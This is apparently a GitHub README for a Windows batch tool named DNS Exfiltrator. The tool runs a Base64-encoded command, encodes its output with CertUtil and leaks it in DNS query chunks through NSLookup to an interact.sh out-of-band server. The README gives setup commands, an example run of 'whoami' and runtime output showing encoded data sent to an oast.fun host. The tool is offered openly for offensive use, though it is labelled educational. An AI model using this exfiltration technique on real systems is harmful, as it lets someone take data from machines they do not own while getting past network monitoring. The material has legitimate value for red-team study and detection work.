# DNS Exfiltrator

Exfiltrate data with DNS queries. Based on CertUtil and NSLookup.

Command output will be encoded in Base64 with CertUtil and exfiltrated in chunks up to 63 characters per query with NSLookup.

Tested on Windows 10 Enterprise OS (64-bit).

Made for educational purposes. I hope it will help!

Future plans:

* make Python script to parse `interact.sh` results,
* make a one-liner out of the whole Batch script,
* make Burp Suite extension that will use Burp Collaborator server.

## How to Run

Download, unpack, give necessary permissions, and run the latest [interact.sh](https://github.com/projectdiscovery/interactsh/releases) client.

```fundamental
chmod +x interactsh-client

./interactsh-client -dns-only -json -o interactsh.json
```

Open the Command Prompt from [\\src\\](https://github.com/ivan-sincek/dns-exfiltrator/tree/main/src) and run the following command:

```fundamental
dns_exfiltrator.bat d2hvYW1p xyz.oast.online
```

Where `d2hvYW1p` is your Batch one-liner encoded in Base64 - `whoami` in this example; and `xyz.oast.online` is your `interact.sh` server.

## Runtime

```fundamental
C:\Users\W10\Desktop>dns_exfiltrator.bat d2hvYW1pIC9wcml2 ch3ypah2vtc0000ca69gget9mfcyyyyyb.oast.fun
################################################################
#                                                              #
#                     DNS Exfiltrator v1.2                     #
#                                by Ivan Sincek                #
#                                                              #
# Exfiltrate data with DNS queries.                            #
# GitHub repository at github.com/ivan-sincek/dns-exfiltrator. #
#                                                              #
################################################################
Server:  UnKnown
Address:  172.20.10.1

Non-authoritative answer:
Name:    UFJJVklMRUdFUyBJTkZPUk1BVElPTiANCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0.ch3ypah2vtc0000ca69gget9mfcyyyyyb.oast.fun
Address:  206.189.156.69

Server:  UnKnown
Address:  172.20.10.1

Non-authoritative answer:
Name:    gDQpQcml2aWxlZ2UgTmFtZSAgICAgICAgICAgICAgICBEZXNjcmlwdGlvbiAgIC.ch3ypah2vtc0000ca69gget9mfcyyyyyb.oast.fun
Address:  206.189.156.69

Server:  UnKnown
Address:  172.20.10.1

Non-authoritative answer:
Name:    AgICAgICAgICAgICAgICAgICAgICAgU3RhdGUgICAgDQo9PT09PT09PT09PT09P.ch3ypah2vtc0000ca69gget9mfcyyyyyb.oast.fun
Address:  206.189.156.69

...
```
